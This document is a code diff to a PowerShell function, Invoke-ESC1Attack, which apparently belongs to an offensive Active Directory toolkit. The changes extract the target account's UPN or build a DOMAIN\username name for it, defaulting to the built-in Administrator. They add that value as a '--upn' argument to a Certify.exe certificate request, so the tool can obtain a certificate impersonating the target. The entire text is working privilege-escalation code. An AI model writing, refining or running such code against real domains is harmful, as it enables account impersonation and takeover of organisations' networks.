@@ -206,6 +206,8 @@ function Invoke-ESC1Attack {
         # Determine target principal SID
         $targetSID = $null
         $targetName = $null
+        $targetUPN = $null
+        $targetNTAccount = $null
         
         if ($TargetPrincipal) {
             # Extract SID from DirectoryEntry object
@@ -214,6 +216,16 @@ function Invoke-ESC1Attack {
                     $sidObj = New-Object System.Security.Principal.SecurityIdentifier($TargetPrincipal.Properties['objectSid'].Value, 0)
                     $targetSID = $sidObj.Value
                     $targetName = $TargetPrincipal.Properties['sAMAccountName'].Value
+                    
+                    # Extract UPN if available
+                    if ($TargetPrincipal.Properties['userPrincipalName'].Value) {
+                        $targetUPN = $TargetPrincipal.Properties['userPrincipalName'].Value
+                        Write-Verbose "Target principal UPN: $targetUPN"
+                    }
+                    
+                    # Construct NTAccount name (DOMAIN\username)
+                    $targetNTAccount = "$netbiosDomain\$targetName"
+                    
                     Write-Verbose "Using target principal: $targetName (SID: $targetSID)"
                 } else {
                     throw "Target principal does not have a valid SID"
@@ -235,6 +247,7 @@ function Invoke-ESC1Attack {
                 if ($domainSid) {
                     $targetSID = "$domainSid-500"
                     $targetName = "Administrator"
+                    $targetNTAccount = "$netbiosDomain\Administrator"
                     Write-Verbose "Using default Administrator account (SID: $targetSID)"
                 } else {
                     # Fallback: try to find Administrator account directly
@@ -242,6 +255,7 @@ function Invoke-ESC1Attack {
                     if ($adminUser) {
                         $targetSID = $adminUser.SID
                         $targetName = $adminUser.Name
+                        $targetNTAccount = "$($adminUser.Domain)\$($adminUser.Name)"
                         Write-Verbose "Found Administrator account via WMI: $targetName (SID: $targetSID)"
                     } else {
                         throw "Could not determine Administrator SID"
@@ -316,6 +330,10 @@ function Invoke-ESC1Attack {
         $certFileName = "ESC1-$templateName-$timestamp.out"
         $certFilePath = Join-Path -Path $OutputPath -ChildPath $certFileName
         
+        # Determine UPN value for Certify command (prefer UPN, fallback to NTAccount)
+        $upnValue = if ($targetUPN) { $targetUPN } else { $targetNTAccount }
+        Write-Verbose "Using UPN value for certificate request: $upnValue"
+        
         # Build Certify.exe command arguments
         $certifyArgs = @(
             "request"
@@ -325,6 +343,8 @@ function Invoke-ESC1Attack {
             $templateName
             "--sid"
             $targetSID
+            "--upn"
+            $upnValue
             "--out-file"
             $certFilePath
         )
